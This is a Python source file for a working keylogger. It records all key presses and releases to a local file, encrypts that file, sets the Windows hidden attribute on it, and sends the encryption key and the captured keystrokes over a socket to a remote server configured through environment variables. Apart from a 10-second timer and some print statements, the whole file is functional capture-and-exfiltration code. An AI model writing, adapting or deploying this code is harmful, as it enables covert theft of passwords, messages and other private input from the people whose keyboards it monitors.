import socket  # For creating a connection to the server
from pynput import keyboard  # For recording keystrokes
from cryptography.fernet import Fernet  # For encrypting the keystrokes file
import os  # For accessing environment variables
import ctypes  # For hiding the keystrokes file (Windows-specific)l
import threading  # To set a timer for stopping the keylogger after a specific duration
from dotenv import load_dotenv  # To load environment variables from the .env file

# Generation of encryption key using Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
file_name = "strokes.txt"
stop_flag = False
load_dotenv()


# Function to stop the keylogger after a specified duration
def stop_recording():
    global stop_flag
    print("Keylogger Stopped due to time completion")
    stop_flag = True


# Function to establish connection with the server
def connection(key):

    server_ip = os.getenv('MY_SERVER')
    port = int(os.getenv('MY_PORT'))

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, port))
        s.sendall(key)
        return s
    except Exception as e:
        print(f"Connection error: {e}")
        exit(1)


# Function to send the encrypted keystrokes file to the server
def send_file(client_socket, file_path):
    try:

        with open(file_path, "rb") as f:
            while True:
                data = f.read(1024)
                if not data:
                    break
                client_socket.send(data)
        print("File sent successfully.")
    except Exception as e:
        print(f"Error sending file: {e}")


# Function to encrypt the keystrokes file using the encryption key
def encrypt_file(file_path):
    try:

        if os.path.exists(file_path):
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = cipher.encrypt(data)


            with open(file_path, "wb") as f:
                f.write(encrypted_data)

            if os.name == "nt":
                FILE_ATT_HIDDEN = 0x02
                ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATT_HIDDEN)

            print("File encrypted successfully.")
            return file_path
        else:
            print(f"File {file_path} does not exist. Skipping encryption.")
            return None
    except Exception as e:
        print(f"Error encrypting file: {e}")


# Function to handle key press events
def on_press(key):
    if stop_flag:
        return False
    try:
        key_data = f"Key pressed: {key.char}\n"
    except AttributeError:
        key_data = f"Key pressed: {key}\n"


    with open(file_name, "ab") as f:
        f.write(key_data.encode())


# Function to handle key release events
def on_release(key):
    if stop_flag:
        return False
    key_data = f"Key released: {key}\n"
    with open(file_name, "ab") as f:
        f.write(key_data.encode())


    if key == keyboard.Key.esc:
        encrypt_file(file_name)


# Function to start recording keystrokes for a specified duration
def record_keystrokes(duration):
    global stop_flag
    stop_flag = False
    timer = threading.Timer(duration, stop_recording)
    timer.start()


    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        print("Recording keystrokes...")
        listener.join()
    timer.cancel()
    print("Stopping keylogger")

    # Encrypt the file after stopping the keylogger
    encrypt_file(file_name)


# Main program
if __name__ == "__main__":

    server_socket = connection(key)


    duration = 10
    record_keystrokes(duration)

    send_file(server_socket, file_name)

    server_socket.close()
